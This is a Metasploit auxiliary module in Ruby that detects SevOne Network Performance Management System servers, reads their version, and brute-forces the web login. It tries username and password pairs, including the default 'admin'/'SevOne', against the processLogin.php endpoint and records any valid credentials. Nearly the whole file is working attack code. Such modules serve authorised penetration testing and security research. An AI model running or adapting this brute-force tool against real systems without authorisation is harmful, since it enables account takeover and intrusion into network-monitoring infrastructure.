##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'SevOne Network Performance Management System application version enumeration and brute force login Utility',
			'Description'    => %{
				This module scans for SevOne Network Performance Management System Application, finds its version,
				and performs login brute force to identify valid credentials.},
			'Author'         =>
				[
					'KarnGaneshen[at]gmail.com',
				],
			'Version'	 => '1.0',
			'DisclosureDate' => 'June 07, 2013',
			'License'        => MSF_LICENSE
		))
		register_options(
			[
				Opt::RPORT(8443),
				OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
				OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'SevOne']),	
				OptString.new('STOP_ON_SUCCESS', [true, 'Stop guessing when a credential works for a host', true])
			], self.class)
	end

	def run_host(ip)
		if not is_app_sevone?
			print_error("Application does not appear to be SevOne. Module will not continue.")
			return
		end

		print_status("Starting login brute force...")
		each_user_pass do |user, pass|
			do_login(user, pass)
		end
	end

	#
	# What's the point of running this module if the app actually isn't SevOne?
	#
	def is_app_sevone?

			res = send_request_cgi(
                        {
                                'uri'       => '/doms/about/index.php',
                                'method'    => 'GET'
                        })

# should include version number

			if (res and res.code.to_i == 200 and res.headers['Set-Cookie'].include?('SEVONE'))
				version_key = /Version: <strong>(.+)<\/strong>/
				version = res.body.scan(version_key).flatten
				print_good("Application confirmed to be SevOne Network Performance Management System version #{version}")
				success = true
			end
	end


	#
	# Brute-force the login page
	#
	def do_login(user, pass)
		vprint_status("Trying username:'#{user}' with password:'#{pass}'")
		
		begin
			res = send_request_cgi(
			{
				'uri'       => "/doms/login/processLogin.php?login=#{user}&passwd=#{pass}&tzOffset=-25200&tzString=Thur+May+05+1983+05:05:00+GMT+0700+",
				'method'    => 'GET'
			})

			check_key = "The user has logged in successfully."

			key = JSON.parse(res.body)["statusString"]

			if (not res or key != "#{check_key}")
				vprint_error("FAILED LOGIN. '#{user}' : '#{pass}' with code #{res.code}")
				return :skip_pass
			else
				print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")

				report_hash = {
					:host   => datastore['RHOST'],
					:port   => datastore['RPORT'],
					:sname  => 'SevOne Network Performance Management System Application',
					:user   => user,
					:pass   => pass,
					:active => true,
					:type => 'password'}

				report_auth_info(report_hash)
				return :next_user
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		       res = false
		rescue ::Timeout::Error, ::Errno::EPIPE

		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			print_error("HTTP Connection Failed, Aborting")
			return :abort
		end
	end
end
